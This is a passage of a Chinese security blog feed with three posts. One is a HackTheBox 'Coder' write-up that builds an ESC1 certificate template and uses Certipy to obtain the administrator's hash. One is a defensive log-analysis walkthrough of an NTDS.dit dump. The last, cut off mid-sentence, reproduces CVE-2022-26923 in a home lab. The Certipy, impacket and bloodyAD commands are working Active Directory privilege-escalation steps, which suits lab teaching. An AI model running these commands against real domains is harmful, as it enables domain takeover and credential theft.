Admins</span></span><br><span class="line"><span class="code">      Write Property Principals       : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Enterprise Admins</span></span><br></pre></td></tr></table></figure><p>假如说我们需要利用的恶意模板是ESC1，那么我们要做的就是将当前的Computer模板修改为满足ESC1特征的模板即可</p><blockquote><p>存在 ESC1 漏洞的证书模板允许低权限用户代表任意由用户指定的域对象进行注册并请求证书。这意味着，任何拥有注册权限的用户都可以为具有高权限的账户（如域管理员账户）请求证书。</p></blockquote><p>ESC1特征为：</p><ul><li>Client Authentication: True</li><li>Enabled: True</li><li>Enrollee Supplies Subject: True    申请证书的人（Enrollee）可以自己填写证书的Subject字段的内容</li><li>Requires Management Approval: False</li><li>Authorized Signatures Required: 0</li></ul><p>上面的Computer模板我们需要修改<code>Enrollee Supplies Subject</code>和<code>Certificate Name Flag</code>  两个字段，现在我们要了解字段怎么进行修改，直接在<a href="https://github.com/ly4k/Certipy/blob/2780d5361121dd4ec79da3f64cfb1984c4f779c6/certipy/lib/constants.py#L73">Certipy的存储库</a>中找到了<code>MS_PKI_CERTIFICATE_NAME_FLAG</code>类，类下每个标志均有对应的数字，<code>ENROLLEE_SUPPLIES_SUBJECT</code>标志对应数字 0x00000001</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427172423.png" alt="微信截图_20250427172423"></p><p>接下来着手进行修改，首先我们先获取一个对象</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Export-ADCSTemplate</span> <span class="literal">-displayname</span> Computer &gt; computer.json</span><br><span class="line"><span class="variable">$computer</span> = <span class="built_in">gc</span> computer.json <span class="literal">-raw</span> | <span class="built_in">ConvertFrom-Json</span></span><br></pre></td></tr></table></figure><p>我们看一下具体需要修改什么值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$computer</span> | <span class="built_in">get-member</span> | findstr Name<span class="literal">-Flag</span></span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427174319.png" alt="微信截图_20250427174319"></p><p>需要修改<code>msPKI-Certificate-Name-Flag</code>，我们将其修改为 0x1</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$computer</span>.<span class="string">&#x27;msPKI-Certificate-Name-Flag&#x27;</span> = <span class="number">0</span>x1</span><br></pre></td></tr></table></figure><p>接下来的步骤就和上面基本上一致了，转回 json格式，创建模板，并为 e.black 注册证书</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$computer</span> | <span class="built_in">ConvertTo-Json</span> | <span class="built_in">Set-Content</span> my<span class="literal">-esc1</span>.json           </span><br><span class="line"><span class="built_in">New-ADCSTemplate</span> <span class="literal">-DisplayName</span> <span class="string">&quot;My-ESC1&quot;</span> <span class="literal">-Publish</span> <span class="literal">-JSON</span> (<span class="built_in">gc</span> my<span class="literal">-esc1</span>.json <span class="literal">-raw</span>)</span><br><span class="line"><span class="built_in">Set-ADCSTemplateACL</span> <span class="literal">-DisplayName</span> <span class="string">&quot;My-ESC1&quot;</span> <span class="literal">-type</span> allow <span class="literal">-identity</span> <span class="string">&#x27;coder\e.black&#x27;</span> <span class="literal">-enroll</span></span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427175559.png" alt="微信截图_20250427175559"></p><p>现在我们利用Certipy-ad扫描一下易受攻击的证书模板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad find -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -target coder.htb -text -stdout -vulnerable  </span><br></pre></td></tr></table></figure><p>输出的结果如下所示</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line"><span class="code">    CA Name                             : coder-DC01-CA</span></span><br><span class="line"><span class="code">    DNS Name                            : dc01.coder.htb</span></span><br><span class="line"><span class="code">    Certificate Subject                 : CN=coder-DC01-CA, DC=coder, DC=htb</span></span><br><span class="line"><span class="code">    Certificate Serial Number           : 2180F0D10CFECB9840260D0730724BDF</span></span><br><span class="line"><span class="code">    Certificate Validity Start          : 2022-06-29 03:51:44+00:00</span></span><br><span class="line"><span class="code">    Certificate Validity End            : 2052-06-29 04:01:44+00:00</span></span><br><span class="line"><span class="code">    Web Enrollment                      : Disabled</span></span><br><span class="line"><span class="code">    User Specified SAN                  : Disabled</span></span><br><span class="line"><span class="code">    Request Disposition                 : Issue</span></span><br><span class="line"><span class="code">    Enforce Encryption for Requests     : Enabled</span></span><br><span class="line"><span class="code">    Permissions</span></span><br><span class="line"><span class="code">      Owner                             : CODER.HTB\Administrators</span></span><br><span class="line"><span class="code">      Access Rights</span></span><br><span class="line"><span class="code">        ManageCertificates              : CODER.HTB\Administrators</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        ManageCa                        : CODER.HTB\Administrators</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        Enroll                          : CODER.HTB\Authenticated Users</span></span><br><span class="line"><span class="code">Certificate Templates</span></span><br><span class="line"><span class="code">  0</span></span><br><span class="line"><span class="code">    Template Name                       : My-ESC1</span></span><br><span class="line"><span class="code">    Display Name                        : My-ESC1</span></span><br><span class="line"><span class="code">    Certificate Authorities             : coder-DC01-CA</span></span><br><span class="line"><span class="code">    Enabled                             : True</span></span><br><span class="line"><span class="code">    Client Authentication               : True</span></span><br><span class="line"><span class="code">    Enrollment Agent                    : False</span></span><br><span class="line"><span class="code">    Any Purpose                         : False</span></span><br><span class="line"><span class="code">    Enrollee Supplies Subject           : True</span></span><br><span class="line"><span class="code">    Certificate Name Flag               : EnrolleeSuppliesSubject</span></span><br><span class="line"><span class="code">    Enrollment Flag                     : AutoEnrollment</span></span><br><span class="line"><span class="code">    Private Key Flag                    : AttestNone</span></span><br><span class="line"><span class="code">    Extended Key Usage                  : Server Authentication</span></span><br><span class="line"><span class="code">                                          Client Authentication</span></span><br><span class="line"><span class="code">    Requires Manager Approval           : False</span></span><br><span class="line"><span class="code">    Requires Key Archival               : False</span></span><br><span class="line"><span class="code">    Authorized Signatures Required      : 0</span></span><br><span class="line"><span class="code">    Validity Period                     : 1 year</span></span><br><span class="line"><span class="code">    Renewal Period                      : 6 weeks</span></span><br><span class="line"><span class="code">    Minimum RSA Key Length              : 2048</span></span><br><span class="line"><span class="code">    Permissions</span></span><br><span class="line"><span class="code">      Enrollment Permissions</span></span><br><span class="line"><span class="code">        Enrollment Rights               : CODER.HTB\Erron Black</span></span><br><span class="line"><span class="code">      Object Control Permissions</span></span><br><span class="line"><span class="code">        Owner                           : CODER.HTB\Erron Black</span></span><br><span class="line"><span class="code">        Full Control Principals         : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Local System</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        Write Owner Principals          : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Local System</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        Write Dacl Principals           : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Local System</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        Write Property Principals       : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Local System</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">    [!] Vulnerabilities</span></span><br><span class="line"><span class="code">      ESC1                              : &#x27;CODER.HTB\\Erron Black&#x27; can enroll, enrollee supplies subject and template allows client authentication</span></span><br><span class="line"><span class="code">      ESC4                              : Template is owned by CODER.HTB\Erron Black</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure><p>扫描完发现存在两个ESC漏洞，这个ESC4不是我们创建的，似乎是原本就存在</p><h3 id="ESC1利用"><a href="#ESC1利用" class="headerlink" title="ESC1利用"></a>ESC1利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad req -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -target coder.htb -ca CODER-DC01-CA -template My-ESC1 -upn administrator@coder.htb</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427183931.png" alt="微信截图_20250427183931"></p><p>可能会出现下面的错误</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427184005.png" alt="微信截图_20250427184005"></p><p>原因是证书不存在了，我们只需要重新发布证书即可</p><p>出现下面的错误只需要再重新申请一次证书即可，仅仅是一个超时罢了</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427184109.png" alt="微信截图_20250427184109"></p><p>接下来使用pfx文件进行管理员认证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad auth -pfx administrator.pfx </span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427184918.png" alt="微信截图_20250427184918"></p><p>仍然成功获取哈希</p><h3 id="Bloodhound自定义查询"><a href="#Bloodhound自定义查询" class="headerlink" title="Bloodhound自定义查询"></a>Bloodhound自定义查询</h3><p>在HTB的官方wp中看到了利用cypher进行域内关系的枚举，简单的学一下cypher并尝试进行一下简单枚举</p><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><div class="table-container"><table><thead><tr><th>元素</th><th>写法</th><th>例子</th><th>解释</th></tr></thead><tbody><tr><td>节点（点）</td><td><code>(变量:标签)</code></td><td><code>(u:User)</code></td><td>一个 User</td></tr><tr><td>关系（边）</td><td><code>-[变量:关系名]-&gt;</code></td><td><code>-[m:MemberOf]-&gt;</code></td><td>成员关系</td></tr><tr><td>查询</td><td><code>MATCH</code></td><td><code>MATCH (u:User)</code></td><td>找所有用户</td></tr><tr><td>返回结果</td><td><code>RETURN</code></td><td><code>RETURN u.name</code></td><td>返回用户名</td></tr><tr><td>条件筛选</td><td><code>WHERE</code></td><td><code>WHERE u.enabled = true</code></td><td>只要启用的账户</td></tr><tr><td></td><td><code>ORDER BY</code></td><td></td><td>排序</td></tr><tr><td></td><td><code>shortestPath</code></td><td></td><td>找最短路径</td></tr><tr><td></td><td><code>LIMIT</code></td><td></td><td>限制返回数量</td></tr></tbody></table></div><h4 id="关系方向"><a href="#关系方向" class="headerlink" title="关系方向"></a>关系方向</h4><p><code>()-[:MemberOf]-&gt;()</code>：<strong>A属于B</strong></p><p><code>()&lt;-[ :HasSession ]-( )</code>：<strong>B有A的会话</strong></p><p>枚举BuildAgent Mgmt组的关联关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(o:OU)-[r:Contains*0..]-&gt;(n) RETURN p</span><br></pre></td></tr></table></figure><blockquote><p><code>*0..</code>：星号+范围，表示可以沿着0条、1条、2条、任意多条 <code>Contains</code> 边行走</p><p><code>(n)</code>：走到的目标节点，叫做 <code>n</code></p></blockquote><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427212922.png" alt="微信截图_20250427212922"></p><p>有助于我们充分了解OU的组成为<code>OU=BUILDAGENTS,OU=DEVELOPMENT,DC=CODER,DC=HTB</code></p><p>接下来全面了解节点的层级结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MATCH (o1)-[r1:Contains]-&gt;(o2:OU) WITH o1 MATCH p=(d)-[r2:Contains*0..]-&gt;(o1)-</span><br><span class="line">[r3:Contains]-&gt;(n) RETURN p</span><br></pre></td></tr></table></figure><p>从域或者更上层的OU，一路Contains找到o1，再看o1下面直接Contains了什么东西</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250427214256.png" alt="微信截图_20250427214256"></p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2022–26923 </tag>
            
            <tag> ESC </tag>
            
            <tag> CI/CD </tag>
            
            <tag> 2FA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-CrownJewel-2</title>
      <link href="/2025/04/23/HTB-CrownJewel-2/"/>
      <url>/2025/04/23/HTB-CrownJewel-2/</url>
      
        <content type="html"><![CDATA[<p><img src="/2025/04/23/HTB-CrownJewel-2/1_xtO4dkLG1iUMOZOz7-nvTQ.webp" alt="1_xtO4dkLG1iUMOZOz7-nvTQ"></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Forela 的域环境一片混乱。刚刚从域控制器收到另一个警报，提示 NTDS.dit 数据库被外泄。就在前一天，你刚响应了一个来自同一域控制器的警报，攻击者通过 vssadmin 工具转储了 NTDS.dit。然而，你成功删除了转储的文件，将攻击者踢出了域控制器，并恢复了一个干净的快照。现在，他们再次使用域管理员账户访问域控制器，凭借在环境中的持久化访问，这次他们正在滥用 ntdsutil 工具转储数据库。在这些混乱的时刻，帮帮 Forela 吧！</span><br></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 在使用 ntdsutil.exe 将 NTDS 转储到磁盘时，它会同时调用 Microsoft 的卷影复制服务。该服务最近一次进入运行状态的时间戳是多少，即可能标志着 NTDS 转储过程启动的时刻？</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> 确认已转储的 NTDS 文件的完整路径。</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> 数据库转储是在何时被创建到磁盘上的？</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> 新转储的数据库在何时被视为已完成并可供使用？</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> 事件日志使用事件源来追踪来自不同来源的事件。哪个事件源提供诸如数据库创建和卸载等状态数据？</span><br><span class="line"></span><br><span class="line"><span class="bullet">6.</span> 当使用 ntdsutil.exe 转储数据库时，它会枚举某些用户组来验证所用帐户的权限。ntdsutil.exe 进程会枚举哪两个组？请按字母顺序列出这些组，并用逗号分隔。</span><br><span class="line"></span><br><span class="line"><span class="bullet">7.</span> 现在，您的任务是查找恶意会话的登录时间。使用登录 ID，查找用户登录会话开始的时间。</span><br></pre></td></tr></table></figure><h2 id="分析解答"><a href="#分析解答" class="headerlink" title="分析解答"></a>分析解答</h2><p>对于问题1，我们在CrownJewel-1中说到了事件ID 7036由<strong>SYSTEM.evtx</strong>日志生成，<strong>记录服务的启动或停止状态发生了变化</strong>，我们仅需在<strong>SYSTEM.evtx</strong>中过滤事件ID 7036</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250423221750.png" alt="微信截图_20250423221750"></p><p>然后查找包含<strong>Volume Shadow Copy</strong>服务的日志条目即可</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250423221927.png" alt="微信截图_20250423221927"></p><p>没有几条日志，我们就找第一条服务进入运行状态的条目即可，在<strong>TimeCreated SystemTime</strong>条目中找到时间戳</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250423222316.png" alt="微信截图_20250423222316"></p><p>因此答案为<strong>2024-05-15 05:39:55</strong></p><p>事件ID 325在创建新数据库时被记录在<strong>APPLICATION.evtx</strong>中，过滤出来，并寻找和上面ntdsutil.exe将NTDS转储到磁盘上的时间相符的事件</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250423223522.png" alt="微信截图_20250423223522"></p><p>答案为<strong>C:\Windows\Temp\dump_tmp\Active Directory\ntds.dit</strong></p><p>数据库创建时间也非常好寻找，将上面的事件转换为XML视图，在TimeCreated SystemTime中即可获得</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250423223836.png" alt="微信截图_20250423223836"></p><p>答案为<strong>2024-05-15 05:39:56</strong></p><p>当数据库引擎分离了转储的NTDS.dit数据库副本时，表明此数据库已经可被使用，此时会触发327事件表示分离数据库的操作</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424143439.png" alt="微信截图_20250424143439"></p><p>根据事件发生的时间可以推测两次的数据库分离都是发生在攻击事件的过程中，获取事件发生的时间时需要注意一下事件查看器面板中关于事件的常规信息<strong>显示的时间戳是根据计算机配置的时区显示的</strong>，要获取原始的UTC时间需要在详细信息的友好视图或者XML视图中获取</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424144132.png" alt="微信截图_20250424144132"></p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424144152.png" alt="微信截图_20250424144152"></p><p>答案为<strong>2024-05-15 05:39:58</strong></p><p>关于使用的事件源我们在CrownJewel-1中提到了</p><blockquote><p><strong>事件源ESENT</strong>是 Windows 事件日志中与<strong>Extensible Storage Engine (ESE)</strong>相关的事件源。ESE 是 Microsoft 的高性能、事务型数据库引擎，被许多 Windows 组件和应用程序用来管理数据存储和访问。我们的Active Directory服务用它来存储目录信息，例如用户、组和计算机对象。</p></blockquote><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424144918.png" alt="微信截图_20250424144918"></p><p>答案为<strong>ESENT</strong></p><p>使用ntdsutil.exe转储数据库时，它会枚举某些用户组来验证所用帐户的权限，这两个组分别为 <code>Administrators</code>和<code>Backup Operators</code></p><blockquote><p>Backup Operators组</p><p>这是具有 <strong>备份权限</strong> 的操作员组，成员可以备份和还原文件（包括即使他们没有显式访问权限的对象），这是转储数据库所必须的权限之一。该组权限较少，不拥有完全的管理权限，但具备访问如 <code>ntds.dit</code>、<code>SYSVOL</code>、<code>registry</code> 等敏感资源的能力。</p></blockquote><p>我们在CrownJewel-1中说到了当某个进程枚举（列出）计算机或设备上某个启用了安全功能的本地组的成员时，会生成4799事件。 我们在<strong>Security.evtx</strong>中筛选一下，并查找与<code>ntdsutil</code>进程有关的事件，我们可以发现这类事件非常的多，从中可以发现<code>ntdsutil</code>枚举的用户组</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424145844.png" alt="微信截图_20250424145844"></p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424145910.png" alt="微信截图_20250424145910"></p><p>登录ID也在其中为<strong>0x8DE3D</strong></p><p>答案为<strong>Administrators, Backup Operators</strong></p><p>查找恶意会话的登录时间我们需要用到几个事件ID</p><p><strong>事件ID 4768</strong> </p><ul><li>此事件表示某个用户请求了 Kerberos TGT（Ticket Granting Ticket），即首次登录 AD 域时的身份验证过程。</li><li>常见用途有：标志某个用户尝试登录域，检测登录尝试、密码猜测行为（频繁失败的4768），以及横向移动</li><li>关键字段有<ul><li><strong>Account Name</strong>：请求票据的用户。</li><li><strong>Client Address</strong>：发起请求的IP地址。</li><li><strong>Result Code</strong>：认证结果（如 0x0 表示成功，0x6 表示用户名无效，0x18 表示密码错误）。</li></ul></li></ul><p><strong>事件 ID 4769</strong></p><ul><li>当用户已经拥有 TGT 后，请求访问具体服务时，系统会请求TGS，此时记录该事件。</li><li>常见用途：检测用户访问了哪些服务，可以帮助分析横向移动（例如使用有效凭据访问其他主机上的服务）</li><li>关键字段：<ul><li><strong>Service Name</strong>：目标服务（如 CIFS、HOST 等）。</li><li><strong>Client Address</strong>：发起访问的IP地址。</li><li><strong>Ticket Encryption Type</strong>：可以用于发现弱加密算法（如 RC4）。</li></ul></li></ul><p><strong>事件 ID 5379</strong></p><ul><li>该事件表示访问了加密密钥材料，如：凭据保护、DPAPI、Credman(Credential Manager) 凭据或密钥保护等。</li><li>常见用途为：<ul><li>检测敏感信息访问，如查看某用户的 Windows 凭据、密钥或使用 Windows Hello、虚拟智能卡。</li><li>可用于发现恶意软件访问用户凭据的行为。</li></ul></li><li>关键字段：<ul><li><strong>Caller Process Name</strong>：访问密钥的进程。</li><li><strong>Subject User Name</strong>：发起访问的用户。</li><li><strong>Key Type</strong>：访问的是哪种密钥，比如 <code>User DPAPI</code>, <code>Virtual Smart Card</code>, <code>Windows Hello</code>, <code>Generic Credentials</code>。</li></ul></li></ul><p>在Security.evtx中筛选4768，4769事件</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424151901.png" alt="微信截图_20250424151901"></p><p>我们在其中发现一个利用Administrator账户进行TGT请求的4768事件，可以发现其下紧跟着一条4769事件</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424152406.png" alt="微信截图_20250424152406"></p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424152443.png" alt="微信截图_20250424152443"></p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424152509.png" alt="微信截图_20250424152509"></p><p>我们接着加入事件ID 5379，此事件中包含我们在上面找到的登录ID<strong>0x8DE3D</strong>，找到最早的一条枚举凭据事件的时间即为我们的答案</p><p><img src="/2025/04/23/HTB-CrownJewel-2/微信截图_20250424152903.png" alt="微信截图_20250424152903"></p><p>答案为<strong>2024-05-15 05:36:31</strong></p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DFIR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022–26923域内提权漏洞</title>
      <link href="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="分析前准备"><a href="#分析前准备" class="headerlink" title="分析前准备"></a>分析前准备</h2><p>这里我已经在我自己搭建的域控上创建了一个名为<code>robert</code>的用户，利用Certipy在AD中利用申请的证书模板进行身份验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad req -u <span class="string">&#x27;robert&#x27;</span> -p <span class="string">&#x27;Passw0rd&#x27;</span> -ca MY-DC-CA -template User -target 192.168.103.201</span><br><span class="line"></span><br><span class="line">certipy-ad auth -pfx chromos2me.pfx -dc-ip 192.168.103.201</span><br></pre></td></tr></table></figure><p>在默认情况下，域用户可以向证书颁发机构申请注册User证书模板，域计算机可以申请注册Machine证书</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250408214215.png" alt="微信截图_20250408214215"></p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250408214242.png" alt="微信截图_20250408214242"></p><p>利用impacket工具包创建一个机器账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addcomputer <span class="string">&#x27;chromos2me.com/robert:Passw0rd&#x27;</span> -computer-name <span class="string">&#x27;ROBERTPC&#x27;</span> -computer-pass <span class="string">&#x27;Passw0rd&#x27;</span> -dc-ip 192.168.103.201 </span><br></pre></td></tr></table></figure><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250408213958.png" alt="微信截图_20250408213958"></p><p>新创建的机器账户不存在<code>dNSHostName</code>属性，我们通过<code>bloodyAD</code>为机器账户创建<code>dNSHostName</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bloodyAD.py -d chromos2me.com -u robert -p Passw0rd --host 192.168.103.201 <span class="built_in">set</span> object <span class="string">&#x27;CN=ROBERTPC,CN=Computers,DC=Chromos2me,DC=com&#x27;</span> dNSHostName -v <span class="string">&#x27;robertpc.chromos2me.com&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>其实也可以通过<code>impacket-addcomputer</code>中的 <code>-computer-name</code>参数进行添加，但是我的机器上会显示成功添加，我在域控上查看的时候<code>dNSHostName</code>并没有成功添加</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410120232.png" alt="微信截图_20250410120232"></p></blockquote><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250408221111.png" alt="微信截图_20250408221111"></p><p>获取<code>Machine</code>证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad req -u <span class="string">&#x27;robertpc$&#x27;</span> -p <span class="string">&#x27;Passw0rd&#x27;</span> -ca MY-DC-CA -template Machine -dc-ip 192.168.103.201</span><br></pre></td></tr></table></figure><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250408232307.png" alt="微信截图_20250408232307"></p><p>进行身份验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad auth -pfx robertpc.pfx -dc-ip 192.168.103.201</span><br></pre></td></tr></table></figure><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250408232237.png" alt="微信截图_20250408232237"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一般来说两个证书的EKU（Extended Key Usage）这个拓展的证书字段均支持<strong>Client Authentication</strong>，这个EKU说明颁发的证书可以通过公钥加密（ Public Key Cryptography for Initial Authentication (PKINIT)）进行Kerberos协议的初始身份验证</p><p>为什么ADCS需要给域用户和域内机器账户提供不同的证书模板？</p><p>这里我们利用ly4k写的<a href="https://github.com/ly4k/BloodHound">支持PKI版本的Bloodhound</a>去看一下每一张证书的标志位，探究一下不同的账户是如何进行身份验证获取证书</p><p>首先是User证书</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409173634.png" alt="微信截图_20250409173634"></p><p><strong>域用户通过UPN唯一标识自己</strong>，我们可以看到证书的Certificate Name Flag字段存在标志位<code>SubjectAltRequireUpn</code>，在微软官方的文档中记录为<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1">CT_FLAG_SUBJECT_ALT_REQUIRE_UPN</a>，此标志指示CA将请求者在AD中用户对象的 UPN （User Principal Name 即我们所说的UPN用户主体名称）属性值添加到颁发证书的主题备用名称（Subject Alternative Name，SAN）扩展中，同时根据微软官方<a 